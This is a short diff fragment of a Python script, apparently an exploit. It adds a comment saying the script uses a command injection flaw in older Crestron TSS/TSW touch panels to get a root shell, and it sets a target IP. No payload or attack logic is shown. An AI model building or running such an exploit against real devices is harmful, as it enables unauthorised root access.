@@ -1,5 +1,8 @@
 #!/usr/bin/env python3
 
+# Exploit a command injection flaw in the older Crestron TS[S|W] models to 
+# get a root shell
+
 import socket
 
 CRESTRON_IP   = '10.10.10.200' # Target IP
